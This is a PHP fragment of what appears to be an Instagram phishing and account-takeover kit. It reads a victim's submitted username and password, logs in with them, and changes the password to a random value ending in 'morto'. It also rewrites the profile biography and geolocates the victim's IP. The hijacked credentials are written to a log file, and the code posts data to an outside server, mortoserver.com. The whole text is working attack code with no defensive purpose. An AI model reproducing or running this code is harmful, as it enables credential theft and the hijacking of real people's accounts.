...
public function Settings($first_name, $email, $username, $phone_number){
  $post = ["first_name" => $first_name, "email" => $email, "username" => $username, "phone_number" => $phone_number, "biography" => "Morto Sikti :)", "external_url" => "", "chaining_enabled" => "on"];   
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
 ...
 return  $this->request("accounts/password/change/", $headers, $post)[1];         
  ...
  curl_setopt($ch, CURLOPT_POST, true);
    ...
    curl_setopt($dch, CURLOPT_URL, 'https://mortoserver.com/mortos2s.php');
...
$userneym= mb_strtolower($_POST["instauser"], 'utf8'); 
	...
	if(isset($log["authenticated"])) {
      ...
      $i->Password($_POST['instapass'], $random . "morto");
      $back = "";
...
$passs=$_POST['instapass'];
	$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
		...
		fwrite($file, "
				...
				<font color='red'>Şifresi(değiştirildi): </font><font color='black'>".$random."morto</font><br>
...
$root .= str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);
      ...
      $get->Password($uyes["password"], $random . "morto");
      $back = "";
